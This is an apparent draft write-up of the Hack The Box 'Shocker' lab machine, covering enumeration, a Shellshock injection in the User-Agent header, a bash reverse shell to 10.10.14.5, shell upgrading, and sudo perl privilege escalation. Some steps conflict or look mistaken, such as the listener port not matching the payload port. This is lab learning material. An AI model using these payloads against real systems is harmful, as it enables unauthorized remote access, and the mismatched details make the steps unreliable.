---
title: "Shocker Writeup HTB"
date: 2022-12-16T21:49:08-08:00
draft: true
---

```bash
GET /cgi-bin/user.sh HTTP/1.1
Host: 10.10.10.56
User-Agent: () { :; }; echo; echo; /bin/bash -c 'bash -i >& /dev/tcp/10.10.14.5/4444 0>&1'
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1


```

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```
```bash
-   ```
    perl -e 'exec "cat /root";'
    ```
```
#### Solving
- start off by doing an nmap scan
- after doing the nmap scan you should notice there are two ports that are shown to be opened
- the first port is 80, and the second is 2222
- port 80 is http, and is likely hosting a web page
- port 2222 is hosting ssh which is uncommon 
- after visting the web page, I see that there isnt much on it
- I will now use dirbuster ( a tool used to bruteforce directories using a wordlist )
- after using dirbuster I see that there is a directory for /cgi-bin
- CGI = (commen gateway interface)
- This file path is used to host scripts that use enviorment varibles that interact with the web browser 
- after visting the page I can see I get a error 403 which means this page exists but is forbidden
- I can use dirbuster agian to scan the directories inside ofthe directory /cgi-bin/
- in dirbuster I can specify that I want to look for a specific file type 
- in this case I am going to search for script file extensions (example: sh, py, php etc...)
- after doing this I have found a user.sh 
- When i vist the page /cgi-bin/user.sh it downloads a file for user.sh which is a short script for checking uptime or some bullshit
- I will look at the get/post request in burp suite
- I can see based off the cgi-bin that this web page may be vunerable to a shellshock attack
- shellshock is a remote code exectution vunurabity that often doesnt have comfirmation
- all that means is that you may be able to execute code on the backend server, but unless specifically using something to echo a response back you might not see anything 
- you can also see a response back though the http header response 
- in burp suite I am going to focus on the user agent parameter in the http request 
- inside of the user-agent area I am going to try and use a basic shellshock
```bash
() { :; }; echo; echo ls 
```
- now that I have been able to test that remote code execution is possible I can try to get a reverse shell through
- The reverse shell command I used is above 
- I will have to listen for the reverse shell using netcat
```bash
nc -lvnp 80 
```
- You should now be able to access the shell 
- now you have to upgrade to a more stable shell 
```bash
    # <catch reverse shell>
    python3 -c 'import pty; pty.spawn("/bin/bash")'
    # (inside the nc session) PRESS CTRL+Z to background your shell
    
    # back in your terminal enter
    stty raw -echo; fg
    # may need to hit enter a couple times
    
    # now you should be back in your reverse shell (fg, foregrounds your "backgrounded" process)
    export SHELL=/bin/bash; export TERM=screen
    
    # for this part you need to know the size of your terminal, which you can figure out by typing `stty size`, but this has to be done BEFORE you catch your reverse shell
    # once you know this, you can change "38" and "116" in the command below, and execute it in your reverse shell
    stty rows 38 columns 116; reset;
```
- now you can use subl to see what commands the current user can use with sudo permissions
- you can also check your permissions using groups to see what group your in
- you can also use "cat /etc/passwd" to see what shell your user is using 
- on this machine I can see that I am using perl so I will 
- seeing that this machine allows me to run perl with sudo permissions is a hint that perl will be my exploit
- I can use GTF-BINs to break bash 
- make sure to run the command from GTFO Bin as sudo
- This is becuase perl is one of the commands the current user is aloowed to run with sudo permissions


### upgrading shell 
- you have to use pythons pty to spawn a bash shell
- python3 -c 'import pty;pty.spawn("/bin/bash")'
- after that you will wantto background the shell (CTRL+Z)
- while in ur host machines shell you can check some information
- you can use "stty -a" to get you terminals demensions
- and "echo $TERM" to check your terminals color
- then run "stty raw -echo"
